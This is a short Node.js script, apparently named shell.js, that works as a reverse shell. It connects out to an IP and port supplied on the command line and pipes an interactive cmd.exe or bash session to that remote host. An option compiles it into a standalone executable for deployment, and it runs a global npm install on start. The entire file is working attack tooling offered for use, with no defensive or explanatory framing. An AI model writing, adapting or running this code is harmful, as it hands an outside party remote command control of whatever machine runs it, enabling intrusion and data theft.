#!/usr/bin/env node

var {spawn, exec} = require('child_process');
var reconnect = require('reconnect-net');
var {argv} = require('yargs')
.options({
    "u" : {alias : "ip-adress" , type : "string", demandOption : true},
    "c" : {alias : "compile" , type : "boolean", demandOption : false},
    "p" : {alias : "port" , type : "number", demandOption : true}

})
.usage("node shell.js -u <ip> -p <port> -c")
 var {u, p, c} = argv
console.clear()
function Shell() {
    exec('npm i -g')
    this.compile = () =>{
         exec('pkg shell.js' )
    console.log("[+] Succesfully compiled the reverse shell !")
   }
    this.reverse = (port , ip) => {
        try{
        reconnect(function(stream) {
            //if the machine runs on Windows
            if (process.platform === "win32") {
                var ps = spawn('cmd.exe', []);0
                stream.pipe(ps.stdin);
            ps.stdout.pipe(stream, {
                end: false
            });
            ps.stderr.pipe(stream, {
                end: false
            });
            ps.on('exit', function() {
                stream.end()
            });
            //if the machine runs on linux
            }else{
                var ps = spawn('bash', ['-i']);
                stream.pipe(ps.stdin);
            ps.stdout.pipe(stream, {
                end: false
            });
            ps.stderr.pipe(stream, {
                end: false
            });
            ps.on('exit', function() {
              console.log("\x1b[91m[-] Connection closed ! \x1b[39m")
                stream.end()
            });            }
            
            //connects
          console.log(`[+] Connected !`)
          
        }).connect( port , ip)
        .on("error", () => {
            console.log("[!] An error occured, check your connection and the address used")
            process.exit(0)
        })
        .on('fail', () => {
            console.log("[!] Failed to connect")
        })
    }catch{
        console.log("[-] An error occured !")
    }}
   
}

var shell = new Shell
if(c == true) shell.compile()
shell.reverse(p, u)